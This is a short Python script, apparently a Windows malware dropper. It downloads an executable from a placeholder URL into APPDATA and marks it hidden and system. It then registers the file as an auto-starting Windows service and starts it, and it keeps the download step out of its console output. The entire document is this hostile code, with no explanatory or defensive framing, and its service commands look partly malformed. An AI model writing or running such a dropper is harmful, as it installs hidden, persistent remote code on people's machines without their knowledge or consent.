import subprocess
import os
import time
import sys

def deploy_command(command):
    try:
        subprocess.run(command, check=True, shell=True)
        time.sleep(1)
        if "curl" not in command: 
            print(f"Deploying command: {command}")
    except subprocess.CalledProcessError as e:
        print(f"Failed: {command}")
        print(str(e))

appdata_path = os.environ.get("APPDATA")
if not appdata_path:
    appdata_path = os.getcwd()

save_path = os.path.join(appdata_path, "scv.exe")

fetch_file = f'curl -o "{save_path}" https://example.com' 
deploy_command(fetch_file)

attrib = f'attrib +h +s "{save_path}"'
deploy_command(attrib)

service = f'sc create Persistence Service binPath= "{save_path}"'
deploy_command(service)

config = f'sc config Persistence Service start= auto'
deploy_command(config)

start = f'sc start Persistence Service'
deploy_command(start)
